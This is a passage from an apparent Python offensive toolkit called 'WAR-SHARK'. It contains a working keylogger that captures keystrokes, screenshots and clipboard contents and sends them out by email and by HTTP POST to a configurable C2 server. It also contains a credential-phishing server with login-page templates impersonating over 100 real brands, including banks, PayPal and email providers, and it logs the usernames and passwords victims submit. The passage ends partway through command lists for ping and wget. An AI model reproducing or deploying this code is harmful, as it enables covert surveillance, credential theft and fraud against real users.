            severity = self._determine_severity(vulnerabilities)
            
            self.db.save_docker_scan(image, vulnerabilities, severity, scan_time, result.returncode == 0)
            
            return {
                'success': result.returncode == 0,
                'image': image,
                'vulnerabilities': vulnerabilities,
                'severity': severity,
                'scan_time': scan_time,
                'output': result.stdout[:2000]
            }
        except subprocess.TimeoutExpired:
            return {'success': False, 'error': 'Scan timed out', 'image': image}
        except Exception as e:
            return {'success': False, 'error': str(e), 'image': image}
    
    def _parse_vulnerabilities(self, output: str) -> List[Dict]:
        vulns = []
        for line in output.split('\n'):
            if 'HIGH' in line or 'CRITICAL' in line or 'MEDIUM' in line:
                severity = 'high' if 'HIGH' in line else 'critical' if 'CRITICAL' in line else 'medium'
                vulns.append({'severity': severity, 'description': line.strip()})
        return vulns
    
    def _determine_severity(self, vulnerabilities: List[Dict]) -> str:
        if any(v.get('severity') == 'critical' for v in vulnerabilities):
            return 'critical'
        if any(v.get('severity') == 'high' for v in vulnerabilities):
            return 'high'
        if vulnerabilities:
            return 'medium'
        return 'low'

# =====================
# KEYLOGGER MODULE
# =====================
class KeyloggerModule:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.running = False
        self.listener = None
        self.text = ""
        self.current_window = ""
        self.current_process = ""
        self.log_file = config.get('keylogger.log_file', KEYLOG_FILE)
        self.c2_server = config.get('keylogger.c2_server', "")
        self.upload_interval = config.get('keylogger.upload_interval', 30)
        self.screenshot_interval = config.get('keylogger.screenshot_interval', 60)
        self.capture_clipboard = config.get('keylogger.capture_clipboard', True)
        self.upload_timer = None
        self.screenshot_timer = None
        self.clipboard_timer = None
        self.last_clipboard = ""
        self.exfil_methods = config.get('keylogger.exfil_methods', ["file", "email", "c2"])
    
    def start(self):
        if not PYNPUT_AVAILABLE:
            print(f"{Colors.ERROR}❌ Keylogger not available (pynput required){Colors.RESET}")
            return False
        
        if self.running:
            return True
        
        try:
            self.running = True
            self.text = ""
            
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()
            
            self.upload_timer = threading.Timer(self.upload_interval, self._upload_keylog)
            self.upload_timer.daemon = True
            self.upload_timer.start()
            
            if self.screenshot_interval > 0:
                self.screenshot_timer = threading.Timer(self.screenshot_interval, self._take_screenshot)
                self.screenshot_timer.daemon = True
                self.screenshot_timer.start()
            
            if self.capture_clipboard:
                self.clipboard_timer = threading.Timer(5, self._monitor_clipboard)
                self.clipboard_timer.daemon = True
                self.clipboard_timer.start()
            
            print(f"{Colors.SUCCESS}✅ Keylogger started (F10 to stop){Colors.RESET}")
            return True
        except Exception as e:
            print(f"{Colors.ERROR}❌ Failed to start keylogger: {e}{Colors.RESET}")
            return False
    
    def stop(self):
        self.running = False
        
        if self.listener:
            self.listener.stop()
            self.listener = None
        
        for timer in [self.upload_timer, self.screenshot_timer, self.clipboard_timer]:
            if timer:
                try:
                    timer.cancel()
                except:
                    pass
        
        self._save_keylog()
        print(f"{Colors.SUCCESS}✅ Keylogger stopped{Colors.RESET}")
    
    def on_press(self, key):
        try:
            if key == keyboard.Key.f10:
                self.stop()
                return False
            
            if key == keyboard.Key.enter:
                self.text += "\n"
            elif key == keyboard.Key.tab:
                self.text += "\t"
            elif key == keyboard.Key.space:
                self.text += " "
            elif key == keyboard.Key.backspace and len(self.text) > 0:
                self.text = self.text[:-1]
            elif hasattr(key, 'char') and key.char is not None:
                self.text += key.char
            
            if len(self.text) > 10000:
                self._save_keylog()
                self.text = ""
        except Exception as e:
            logger.error(f"Keylogger error: {e}")
    
    def _save_keylog(self):
        if self.text:
            timestamp = datetime.now().isoformat()
            screenshot_path = ""
            
            if self.screenshot_interval > 0:
                screenshot_path = self._take_screenshot()
            
            self.db.save_keylog(self.text, self.current_window, self.current_process, screenshot_path)
            
            with open(self.log_file, 'a') as f:
                f.write(f"\n[{timestamp}] [{self.current_window}]\n{self.text}\n")
            
            self._exfiltrate_data(self.text, screenshot_path)
            logger.info(f"Saved {len(self.text)} keylog characters")
    
    def _take_screenshot(self) -> str:
        try:
            import pyautogui
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            screenshot_path = os.path.join(KEYLOG_EXFIL_DIR, f"screenshot_{timestamp}.png")
            screenshot = pyautogui.screenshot()
            screenshot.save(screenshot_path)
            logger.info(f"Screenshot saved: {screenshot_path}")
            return screenshot_path
        except:
            return ""
    
    def _monitor_clipboard(self):
        if not self.running:
            return
        
        try:
            import pyperclip
            current = pyperclip.paste()
            if current and current != self.last_clipboard:
                self.last_clipboard = current
                self.db.save_clipboard(current, "keylogger")
                logger.info(f"Clipboard captured: {current[:100]}...")
                self._exfiltrate_clipboard(current)
        except:
            pass
        
        if self.running:
            self.clipboard_timer = threading.Timer(5, self._monitor_clipboard)
            self.clipboard_timer.daemon = True
            self.clipboard_timer.start()
    
    def _exfiltrate_data(self, text: str, screenshot_path: str = ""):
        for method in self.exfil_methods:
            try:
                if method == "file":
                    self._exfil_file(text, screenshot_path)
                elif method == "email":
                    self._exfil_email(text, screenshot_path)
                elif method == "c2":
                    self._exfil_c2(text, screenshot_path)
            except Exception as e:
                logger.error(f"Exfil via {method} failed: {e}")
    
    def _exfil_file(self, text: str, screenshot_path: str):
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = os.path.join(KEYLOG_EXFIL_DIR, f"exfil_{timestamp}.txt")
            with open(filename, 'w') as f:
                f.write(f"[{timestamp}]\n{text}\n")
                if screenshot_path:
                    f.write(f"\nScreenshot: {screenshot_path}\n")
            logger.info(f"Exfil saved to file: {filename}")
        except:
            pass
    
    def _exfil_email(self, text: str, screenshot_path: str):
        try:
            smtp_server = self.config.get('spear_phishing.smtp_server', '')
            smtp_port = self.config.get('spear_phishing.smtp_port', 587)
            smtp_username = self.config.get('spear_phishing.smtp_username', '')
            smtp_password = self.config.get('spear_phishing.smtp_password', '')
            to_email = self.config.get('keylogger.email_recipient', '')
            
            if not all([smtp_server, smtp_username, smtp_password, to_email]):
                return
            
            msg = email.message.EmailMessage()
            msg['Subject'] = f"Keylog Data - {datetime.now().isoformat()}"
            msg['From'] = smtp_username
            msg['To'] = to_email
            msg.set_content(f"Keylog Data:\n\n{text}")
            
            if screenshot_path and os.path.exists(screenshot_path):
                with open(screenshot_path, 'rb') as f:
                    msg.add_attachment(f.read(), maintype='image', subtype='png', filename=os.path.basename(screenshot_path))
            
            with smtplib.SMTP(smtp_server, smtp_port) as server:
                server.starttls()
                server.login(smtp_username, smtp_password)
                server.send_message(msg)
            
            logger.info("Keylog exfiltrated via email")
        except:
            pass
    
    def _exfil_c2(self, text: str, screenshot_path: str):
        if not self.c2_server:
            return
        try:
            data = {
                'timestamp': datetime.now().isoformat(),
                'text': text,
                'hostname': socket.gethostname(),
                'window': self.current_window
            }
            if screenshot_path:
                data['screenshot'] = base64.b64encode(open(screenshot_path, 'rb').read()).decode()
            
            requests.post(self.c2_server, json=data, timeout=10)
            logger.info("Keylog exfiltrated via C2")
        except:
            pass
    
    def _exfiltrate_clipboard(self, text: str):
        for method in self.exfil_methods:
            try:
                if method == "file":
                    self._exfil_file(f"CLIPBOARD: {text}", "")
                elif method == "email":
                    self._exfil_email(f"CLIPBOARD: {text}", "")
                elif method == "c2":
                    self._exfil_c2(f"CLIPBOARD: {text}", "")
            except:
                pass
    
    def _upload_keylog(self):
        if self.text:
            self._save_keylog()
            self.text = ""
        
        if self.running:
            self.upload_timer = threading.Timer(self.upload_interval, self._upload_keylog)
            self.upload_timer.daemon = True
            self.upload_timer.start()
    
    def get_keylogs(self, limit: int = 100):
        return self.db.get_keylogs(limit)
    
    def get_screenshots(self) -> List[str]:
        try:
            return [f for f in os.listdir(KEYLOG_EXFIL_DIR) if f.startswith('screenshot_')]
        except:
            return []

# =====================
# SOCIAL ENGINEERING TOOLS (100+ Templates)
# =====================
class SocialEngineeringTools:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.phishing_server = None
        self.active_links = {}
        self.templates = self._load_templates()
    
    def _load_templates(self) -> Dict:
        return {
            # Social Media (1-20)
            'facebook': self._facebook_template,
            'instagram': self._instagram_template,
            'twitter': self._twitter_template,
            'linkedin': self._linkedin_template,
            'tiktok': self._tiktok_template,
            'snapchat': self._snapchat_template,
            'reddit': self._reddit_template,
            'pinterest': self._pinterest_template,
            'tumblr': self._tumblr_template,
            'flickr': self._flickr_template,
            'vk': self._vk_template,
            'weibo': self._weibo_template,
            'telegram': self._telegram_template,
            'whatsapp': self._whatsapp_template,
            'discord': self._discord_template,
            'slack': self._slack_template,
            'mastodon': self._mastodon_template,
            'threads': self._threads_template,
            'clubhouse': self._clubhouse_template,
            'nextdoor': self._nextdoor_template,
            
            # Email Providers (21-35)
            'gmail': self._gmail_template,
            'yahoo': self._yahoo_template,
            'outlook': self._outlook_template,
            'hotmail': self._hotmail_template,
            'aol': self._aol_template,
            'protonmail': self._protonmail_template,
            'zoho': self._zoho_template,
            'icloud': self._icloud_template,
            'gmx': self._gmx_template,
            'mail_com': self._mail_com_template,
            'yandex': self._yandex_template,
            'fastmail': self._fastmail_template,
            'tutanota': self._tutanota_template,
            'mailfence': self._mailfence_template,
            'posteo': self._posteo_template,
            
            # Cloud Storage (36-45)
            'dropbox': self._dropbox_template,
            'google_drive': self._google_drive_template,
            'onedrive': self._onedrive_template,
            'icloud_drive': self._icloud_drive_template,
            'box': self._box_template,
            'mega': self._mega_template,
            'pcloud': self._pcloud_template,
            'mediafire': self._mediafire_template,
            'sync_com': self._sync_com_template,
            'amazon_drive': self._amazon_drive_template,
            
            # Financial Services (46-60)
            'paypal': self._paypal_template,
            'venmo': self._venmo_template,
            'cashapp': self._cashapp_template,
            'zelle': self._zelle_template,
            'chase': self._chase_template,
            'wells_fargo': self._wells_fargo_template,
            'bank_of_america': self._bank_of_america_template,
            'citibank': self._citibank_template,
            'capital_one': self._capital_one_template,
            'discover': self._discover_template,
            'american_express': self._american_express_template,
            'barclays': self._barclays_template,
            'hsbc': self._hsbc_template,
            'santander': self._santander_template,
            'revolut': self._revolut_template,
            
            # Gaming (61-75)
            'steam': self._steam_template,
            'epic_games': self._epic_games_template,
            'roblox': self._roblox_template,
            'minecraft': self._minecraft_template,
            'xbox': self._xbox_template,
            'playstation': self._playstation_template,
            'nintendo': self._nintendo_template,
            'twitch': self._twitch_template,
            'discord_gaming': self._discord_gaming_template,
            'riot_games': self._riot_games_template,
            'blizzard': self._blizzard_template,
            'ea_games': self._ea_games_template,
            'ubisoft': self._ubisoft_template,
            'rockstar': self._rockstar_template,
            'gog': self._gog_template,
            
            # Streaming (76-85)
            'netflix': self._netflix_template,
            'hulu': self._hulu_template,
            'disney_plus': self._disney_plus_template,
            'hbo_max': self._hbo_max_template,
            'amazon_prime': self._amazon_prime_template,
            'spotify': self._spotify_template,
            'apple_music': self._apple_music_template,
            'youtube_premium': self._youtube_premium_template,
            'peacock': self._peacock_template,
            'paramount_plus': self._paramount_plus_template,
            
            # Productivity (86-100)
            'microsoft': self._microsoft_template,
            'google': self._google_template,
            'apple': self._apple_template,
            'adobe': self._adobe_template,
            'zoom': self._zoom_template,
            'teams': self._teams_template,
            'webex': self._webex_template,
            'slack_workspace': self._slack_workspace_template,
            'asana': self._asana_template,
            'trello': self._trello_template,
            'notion': self._notion_template,
            'evernote': self._evernote_template,
            'todoist': self._todoist_template,
            'monday': self._monday_template,
            'clickup': self._clickup_template,
            
            # Shopping (101-110)
            'amazon': self._amazon_template,
            'ebay': self._ebay_template,
            'walmart': self._walmart_template,
            'target': self._target_template,
            'best_buy': self._best_buy_template,
            'costco': self._costco_template,
            'alibaba': self._alibaba_template,
            'aliexpress': self._aliexpress_template,
            'etsy': self._etsy_template,
            'shopify': self._shopify_template,
            
            # Custom
            'custom': self._custom_template
        }
    
    def generate_phishing_link(self, platform: str) -> Dict:
        link_id = str(uuid.uuid4())[:8]
        template_func = self.templates.get(platform, self._custom_template)
        html = template_func()
        
        link = PhishingLink(
            id=link_id,
            platform=platform,
            phishing_url=f"http://localhost:8080",
            template=platform,
            created_at=datetime.now().isoformat()
        )
        
        self.db.save_phishing_link(link)
        self.active_links[link_id] = {'platform': platform, 'html': html}
        
        return {'success': True, 'link_id': link_id, 'platform': platform}
    
    def start_server(self, link_id: str, port: int = 8080) -> bool:
        if link_id not in self.active_links:
            return False
        link_data = self.active_links[link_id]
        
        class PhishingHandler(BaseHTTPRequestHandler):
            server_instance = None
            
            def do_GET(self):
                self.send_response(200)
                self.send_header('Content-Type', 'text/html')
                self.end_headers()
                if self.server_instance and self.server_instance.html:
                    self.wfile.write(self.server_instance.html.encode())
            
            def do_POST(self):
                content_length = int(self.headers.get('Content-Length', 0))
                post_data = self.rfile.read(content_length).decode()
                form_data = urllib.parse.parse_qs(post_data)
                
                username = form_data.get('email', form_data.get('username', ['']))[0]
                password = form_data.get('password', [''])[0]
                client_ip = self.client_address[0]
                user_agent = self.headers.get('User-Agent', 'Unknown')
                
                if self.server_instance and self.server_instance.db and username and password:
                    self.server_instance.db.save_captured_credential(
                        self.server_instance.link_id, username, password, client_ip, user_agent
                    )
                    print(f"\n{Colors.ERROR}🎣 CREDENTIALS CAPTURED!{Colors.RESET}")
                    print(f"  IP: {client_ip}")
                    print(f"  Username: {username}")
                    print(f"  Password: {password}")
                
                self.send_response(302)
                self.send_header('Location', 'https://www.google.com')
                self.end_headers()
        
        server = HTTPServer(('0.0.0.0', port), PhishingHandler)
        server.server_instance = self
        server.link_id = link_id
        server.html = link_data['html']
        
        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()
        self.phishing_server = server
        
        return True
    
    def stop_server(self):
        if self.phishing_server:
            self.phishing_server.shutdown()
            self.phishing_server = None
    
    def get_captured_credentials(self, link_id: str = None) -> List[Dict]:
        return self.db.get_captured_credentials(link_id)
    
    def _get_template(self, name: str, color: str, display_name: str) -> str:
        return f"""<!DOCTYPE html>
<html><head><title>{display_name}</title>
<style>
body{{font-family:Arial;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}}
.login-box{{background:white;border-radius:8px;padding:20px;width:400px;box-shadow:0 2px 4px rgba(0,0,0,.1)}}
.logo{{color:{color};font-size:32px;text-align:center;margin-bottom:20px}}
input{{width:100%;padding:14px;margin:10px 0;border:1px solid #dddfe2;border-radius:6px;box-sizing:border-box}}
button{{width:100%;padding:14px;background:{color};color:white;border:none;border-radius:6px;font-size:20px;cursor:pointer}}
.warning{{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center;border-radius:4px;font-size:12px}}
</style>
</head>
<body>
<div class="login-box"><div class="logo">{display_name}</div>
<form method="POST"><input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    # Template methods - Social Media
    def _facebook_template(self): return self._get_template("facebook", "#1877f2", "Facebook")
    def _instagram_template(self): return self._get_template("instagram", "#0095f6", "Instagram")
    def _twitter_template(self): return self._get_template("twitter", "#1d9bf0", "X / Twitter")
    def _linkedin_template(self): return self._get_template("linkedin", "#0a66c2", "LinkedIn")
    def _tiktok_template(self): return self._get_template("tiktok", "#fe2c55", "TikTok")
    def _snapchat_template(self): return self._get_template("snapchat", "#fffc00", "Snapchat")
    def _reddit_template(self): return self._get_template("reddit", "#ff4500", "Reddit")
    def _pinterest_template(self): return self._get_template("pinterest", "#e60023", "Pinterest")
    def _tumblr_template(self): return self._get_template("tumblr", "#36465d", "Tumblr")
    def _flickr_template(self): return self._get_template("flickr", "#ff0084", "Flickr")
    def _vk_template(self): return self._get_template("vk", "#4c75a3", "VK")
    def _weibo_template(self): return self._get_template("weibo", "#e6162d", "Weibo")
    def _telegram_template(self): return self._get_template("telegram", "#2aabee", "Telegram")
    def _whatsapp_template(self): return self._get_template("whatsapp", "#25d366", "WhatsApp")
    def _discord_template(self): return self._get_template("discord", "#5865f2", "Discord")
    def _slack_template(self): return self._get_template("slack", "#611f69", "Slack")
    def _mastodon_template(self): return self._get_template("mastodon", "#6364ff", "Mastodon")
    def _threads_template(self): return self._get_template("threads", "#000000", "Threads")
    def _clubhouse_template(self): return self._get_template("clubhouse", "#f0e5d8", "Clubhouse")
    def _nextdoor_template(self): return self._get_template("nextdoor", "#8ed500", "Nextdoor")
    
    # Email Providers
    def _gmail_template(self): return self._get_template("gmail", "#1a73e8", "Gmail")
    def _yahoo_template(self): return self._get_template("yahoo", "#410093", "Yahoo")
    def _outlook_template(self): return self._get_template("outlook", "#0078d4", "Outlook")
    def _hotmail_template(self): return self._get_template("hotmail", "#0078d4", "Hotmail")
    def _aol_template(self): return self._get_template("aol", "#0060a9", "AOL")
    def _protonmail_template(self): return self._get_template("protonmail", "#505061", "ProtonMail")
    def _zoho_template(self): return self._get_template("zoho", "#e42527", "Zoho")
    def _icloud_template(self): return self._get_template("icloud", "#0071e3", "iCloud")
    def _gmx_template(self): return self._get_template("gmx", "#1c449b", "GMX")
    def _mail_com_template(self): return self._get_template("mail_com", "#004d8c", "Mail.com")
    def _yandex_template(self): return self._get_template("yandex", "#fc3f1d", "Yandex")
    def _fastmail_template(self): return self._get_template("fastmail", "#0067c5", "FastMail")
    def _tutanota_template(self): return self._get_template("tutanota", "#840010", "Tutanota")
    def _mailfence_template(self): return self._get_template("mailfence", "#00a4e4", "Mailfence")
    def _posteo_template(self): return self._get_template("posteo", "#00954c", "Posteo")
    
    # Cloud Storage
    def _dropbox_template(self): return self._get_template("dropbox", "#0061ff", "Dropbox")
    def _google_drive_template(self): return self._get_template("google_drive", "#4285f4", "Google Drive")
    def _onedrive_template(self): return self._get_template("onedrive", "#0078d4", "OneDrive")
    def _icloud_drive_template(self): return self._get_template("icloud_drive", "#0071e3", "iCloud Drive")
    def _box_template(self): return self._get_template("box", "#0061d5", "Box")
    def _mega_template(self): return self._get_template("mega", "#d9272e", "MEGA")
    def _pcloud_template(self): return self._get_template("pcloud", "#00b0ff", "pCloud")
    def _mediafire_template(self): return self._get_template("mediafire", "#1299f3", "MediaFire")
    def _sync_com_template(self): return self._get_template("sync_com", "#0078d4", "Sync.com")
    def _amazon_drive_template(self): return self._get_template("amazon_drive", "#ff9900", "Amazon Drive")
    
    # Financial
    def _paypal_template(self): return self._get_template("paypal", "#0070ba", "PayPal")
    def _venmo_template(self): return self._get_template("venmo", "#008cff", "Venmo")
    def _cashapp_template(self): return self._get_template("cashapp", "#00d632", "Cash App")
    def _zelle_template(self): return self._get_template("zelle", "#6d1ed4", "Zelle")
    def _chase_template(self): return self._get_template("chase", "#1174c2", "Chase")
    def _wells_fargo_template(self): return self._get_template("wells_fargo", "#bc1f2c", "Wells Fargo")
    def _bank_of_america_template(self): return self._get_template("bank_of_america", "#012169", "Bank of America")
    def _citibank_template(self): return self._get_template("citibank", "#003b70", "Citibank")
    def _capital_one_template(self): return self._get_template("capital_one", "#004977", "Capital One")
    def _discover_template(self): return self._get_template("discover", "#ff6000", "Discover")
    def _american_express_template(self): return self._get_template("american_express", "#006fcf", "American Express")
    def _barclays_template(self): return self._get_template("barclays", "#00aeef", "Barclays")
    def _hsbc_template(self): return self._get_template("hsbc", "#db0011", "HSBC")
    def _santander_template(self): return self._get_template("santander", "#ec0000", "Santander")
    def _revolut_template(self): return self._get_template("revolut", "#0075eb", "Revolut")
    
    # Gaming
    def _steam_template(self): return self._get_template("steam", "#67c1f5", "Steam")
    def _epic_games_template(self): return self._get_template("epic_games", "#000000", "Epic Games")
    def _roblox_template(self): return self._get_template("roblox", "#e32c2c", "Roblox")
    def _minecraft_template(self): return self._get_template("minecraft", "#6b8c42", "Minecraft")
    def _xbox_template(self): return self._get_template("xbox", "#107c10", "Xbox")
    def _playstation_template(self): return self._get_template("playstation", "#003791", "PlayStation")
    def _nintendo_template(self): return self._get_template("nintendo", "#e60012", "Nintendo")
    def _twitch_template(self): return self._get_template("twitch", "#9146ff", "Twitch")
    def _discord_gaming_template(self): return self._get_template("discord_gaming", "#5865f2", "Discord")
    def _riot_games_template(self): return self._get_template("riot_games", "#d13639", "Riot Games")
    def _blizzard_template(self): return self._get_template("blizzard", "#00aeff", "Blizzard")
    def _ea_games_template(self): return self._get_template("ea_games", "#ff0000", "EA Games")
    def _ubisoft_template(self): return self._get_template("ubisoft", "#0070ff", "Ubisoft")
    def _rockstar_template(self): return self._get_template("rockstar", "#fcaf17", "Rockstar Games")
    def _gog_template(self): return self._get_template("gog", "#8b00ff", "GOG")
    
    # Streaming
    def _netflix_template(self): return self._get_template("netflix", "#e50914", "Netflix")
    def _hulu_template(self): return self._get_template("hulu", "#1ce783", "Hulu")
    def _disney_plus_template(self): return self._get_template("disney_plus", "#113ccf", "Disney+")
    def _hbo_max_template(self): return self._get_template("hbo_max", "#5822b4", "HBO Max")
    def _amazon_prime_template(self): return self._get_template("amazon_prime", "#00a8e1", "Amazon Prime")
    def _spotify_template(self): return self._get_template("spotify", "#1ed760", "Spotify")
    def _apple_music_template(self): return self._get_template("apple_music", "#fa243c", "Apple Music")
    def _youtube_premium_template(self): return self._get_template("youtube_premium", "#ff0000", "YouTube Premium")
    def _peacock_template(self): return self._get_template("peacock", "#000000", "Peacock")
    def _paramount_plus_template(self): return self._get_template("paramount_plus", "#0064ff", "Paramount+")
    
    # Productivity
    def _microsoft_template(self): return self._get_template("microsoft", "#0078d4", "Microsoft")
    def _google_template(self): return self._get_template("google", "#4285f4", "Google")
    def _apple_template(self): return self._get_template("apple", "#0071e3", "Apple")
    def _adobe_template(self): return self._get_template("adobe", "#ff0000", "Adobe")
    def _zoom_template(self): return self._get_template("zoom", "#2d8cff", "Zoom")
    def _teams_template(self): return self._get_template("teams", "#5059e8", "Teams")
    def _webex_template(self): return self._get_template("webex", "#00bceb", "Webex")
    def _slack_workspace_template(self): return self._get_template("slack_workspace", "#611f69", "Slack")
    def _asana_template(self): return self._get_template("asana", "#f06a6a", "Asana")
    def _trello_template(self): return self._get_template("trello", "#0079bf", "Trello")
    def _notion_template(self): return self._get_template("notion", "#000000", "Notion")
    def _evernote_template(self): return self._get_template("evernote", "#00a82d", "Evernote")
    def _todoist_template(self): return self._get_template("todoist", "#e44332", "Todoist")
    def _monday_template(self): return self._get_template("monday", "#ff3d57", "Monday.com")
    def _clickup_template(self): return self._get_template("clickup", "#7b68ee", "ClickUp")
    
    # Shopping
    def _amazon_template(self): return self._get_template("amazon", "#ff9900", "Amazon")
    def _ebay_template(self): return self._get_template("ebay", "#e53238", "eBay")
    def _walmart_template(self): return self._get_template("walmart", "#0071ce", "Walmart")
    def _target_template(self): return self._get_template("target", "#cc0000", "Target")
    def _best_buy_template(self): return self._get_template("best_buy", "#0046be", "Best Buy")
    def _costco_template(self): return self._get_template("costco", "#e31837", "Costco")
    def _alibaba_template(self): return self._get_template("alibaba", "#ff6a00", "Alibaba")
    def _aliexpress_template(self): return self._get_template("aliexpress", "#ff4747", "AliExpress")
    def _etsy_template(self): return self._get_template("etsy", "#f1641e", "Etsy")
    def _shopify_template(self): return self._get_template("shopify", "#96bf48", "Shopify")
    
    def _custom_template(self):
        return """<!DOCTYPE html>
<html><head><title>Secure Login</title>
<style>
body{font-family:Arial;background:linear-gradient(135deg,#0a1628 0%,#1a2a6c 50%,#0f3460 100%);display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:rgba(255,255,255,0.05);backdrop-filter:blur(10px);border-radius:16px;padding:40px;width:400px;box-shadow:0 20px 60px rgba(0,0,0,0.5);border:1px solid rgba(255,255,255,0.1)}
.logo{text-align:center;margin-bottom:30px;color:#3f9dff;font-size:28px;font-weight:bold}
input{width:100%;padding:14px;margin:10px 0;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);border-radius:8px;color:#fff;box-sizing:border-box;transition:all 0.3s}
input:focus{outline:none;border-color:#3f9dff;background:rgba(255,255,255,0.08)}
button{width:100%;padding:14px;background:linear-gradient(135deg,#3f9dff 0%,#1565c0 100%);color:white;border:none;border-radius:8px;cursor:pointer;font-weight:bold;font-size:16px;transition:all 0.3s}
button:hover{transform:scale(1.02);box-shadow:0 10px 30px rgba(63,157,255,0.3)}
.warning{margin-top:20px;padding:10px;background:rgba(255,0,0,0.1);border-radius:8px;color:#ff6b6b;text-align:center;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">🦈 WAR-SHARK</div>
<form method="POST"><input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Secure Login</button></form>
<div class="warning">🔒 Secure connection - Do not enter real credentials</div>
</div>
</body>
</html>"""

# =====================
# COMMAND LIBRARIES
# =====================
class CommandLibraries:
    """Contains all command libraries for different tools"""
    
    PING_COMMANDS = {
        "ping_basic": ["ping", "{target}"],
        "ping_count": ["ping", "-c", "{count}", "{target}"],
        "ping_interval": ["ping", "-i", "{interval}", "{target}"],
        "ping_flood": ["ping", "-f", "{target}"],
        "ping_packet_size": ["ping", "-s", "{size}", "{target}"],
        "ping_timeout": ["ping", "-W", "{timeout}", "{target}"],
        "ping_deadline": ["ping", "-w", "{deadline}", "{target}"],
        "ping_quiet": ["ping", "-q", "-c", "{count}", "{target}"],
        "ping_verbose": ["ping", "-v", "{target}"],
        "ping_numeric": ["ping", "-n", "{target}"],
        "ping_audible": ["ping", "-a", "{target}"],
        "ping_adaptive": ["ping", "-A", "{target}"],
        "ping_ttl": ["ping", "-t", "{ttl}", "{target}"],
        "ping_interface": ["ping", "-I", "{interface}", "{target}"],
        "ping_source": ["ping", "-S", "{source_ip}", "{target}"],
        "ping_pattern": ["ping", "-p", "{pattern}", "{target}"],
        "ping_record_route": ["ping", "-R", "{target}"],
        "ping_ipv4": ["ping", "-4", "{target}"],
        "ping_ipv6": ["ping", "-6", "{target}"],
        "ping_broadcast": ["ping", "-b", "{target}"],
    }
    
    TRACEROUTE_COMMANDS = {
        "traceroute_basic": ["traceroute", "{target}"],
        "traceroute_ipv4": ["traceroute", "-4", "{target}"],
        "traceroute_ipv6": ["traceroute", "-6", "{target}"],
        "traceroute_icmp": ["traceroute", "-I", "{target}"],
        "traceroute_tcp": ["traceroute", "-T", "{target}"],
        "traceroute_udp": ["traceroute", "-U", "{target}"],
        "traceroute_max_hops": ["traceroute", "-m", "{max_hops}", "{target}"],
        "traceroute_first_hop": ["traceroute", "-f", "{first_hop}", "{target}"],
        "traceroute_queries": ["traceroute", "-q", "{queries}", "{target}"],
        "traceroute_wait": ["traceroute", "-w", "{wait}", "{target}"],
        "traceroute_port": ["traceroute", "-p", "{port}", "{target}"],
        "traceroute_numeric": ["traceroute", "-n", "{target}"],
        "traceroute_verbose": ["traceroute", "-v", "{target}"],
        "traceroute_debug": ["traceroute", "-d", "{target}"],
        "traceroute_dont_fragment": ["traceroute", "-F", "{target}"],
        "traceroute_interface": ["traceroute", "-i", "{interface}", "{target}"],
        "traceroute_source": ["traceroute", "-s", "{source_ip}", "{target}"],
        "traceroute_tos": ["traceroute", "-t", "{tos}", "{target}"],
        "traceroute_as_lookup": ["traceroute", "-A", "{target}"],
        "traceroute_help": ["traceroute", "--help"],
        "traceroute_version": ["traceroute", "-V"],
        "traceroute6_basic": ["traceroute6", "{target}"],
        "tcptraceroute": ["tcptraceroute", "{target}"],
        "tcptraceroute_port": ["tcptraceroute", "-p", "{port}", "{target}"],
        "mtr_report": ["mtr", "--report", "{target}"],
        "mtr_report_cycles": ["mtr", "--report", "--report-cycles", "{cycles}", "{target}"],
    }
    
    WGET_COMMANDS = {
        "wget_basic": ["wget", "{url}"],
        "wget_output": ["wget", "-O", "{output}", "{url}"],
        "wget_continue": ["wget", "-c", "{url}"],
        "wget_background": ["wget", "-b", "{url}"],
        "wget_quiet": ["wget", "-q", "{url}"],
        "wget_verbose": ["wget", "-v", "{url}"],
        "wget_no_verbose": ["wget", "-nv", "{url}"],
        "wget_debug": ["wget", "-d", "{url}"],
        "wget_input_file": ["wget", "-i", "{input_file}"],
        "wget_spider": ["wget", "--spider", "{url}"],
        "wget_recursive": ["wget", "-r", "{url}"],
        "wget_level": ["wget", "-r", "-l", "{level}", "{url}"],
        "wget_mirror": ["wget", "-m", "{url}"],
        "wget_page_requisites": ["wget", "-p", "{url}"],
        "wget_convert_links": ["wget", "-k", "{url}"],
        "wget_no_parent": ["wget", "-np", "{url}"],
        "wget_no_host_dirs": ["wget", "-nH", "{url}"],
        "wget_directory_prefix": ["wget", "-P", "{prefix}", "{url}"],
        "wget_no_directories": ["wget", "-nd", "{url}"],
        "wget_force_directories": ["wget", "-x", "{url}"],
        "wget_span_hosts": ["wget", "-H", "{url}"],
        "wget_accept": ["wget", "-A", "{accept_list}", "{url}"],
        "wget_reject": ["wget", "-R", "{reject_list}", "{url}"],
        "wget_header": ["wget", "--header", "{header}", "{url}"],
        "wget_user_agent": ["wget", "-U", "{user_agent}", "{url}"],
        "wget_referer": ["wget", "--referer", "{referer}", "{url}"],
        "wget_no_check_certificate": ["wget", "--no-check-certificate", "{url}"],
        "wget_random_wait": ["wget", "--random-wait", "{url}"],
        "wget_wait": ["wget", "-w", "{wait}", "{url}"],
        "wget_limit_rate": ["wget", "--limit-rate", "{rate}", "{url}"],
        "wget_tries": ["wget", "-t", "{tries}", "{url}"],
        "wget_timeout": ["wget", "-T", "{timeout}", "{url}"],
        "wget_inet4_only": ["wget", "-4", "{url}"],
        "wget_inet6_only": ["wget", "-6", "{url}"],
        "wget_bind_address": ["wget", "--bind-address", "{address}", "{url}"],
        "wget_user_password": ["wget", "--user", "{user}", "--password", "{password}", "{url}"],
        "wget_no_cookies": ["wget", "--no-cookies", "{url}"],
        "wget_load_cookies": ["wget", "--load-cookies", "{cookies}", "{url}"],
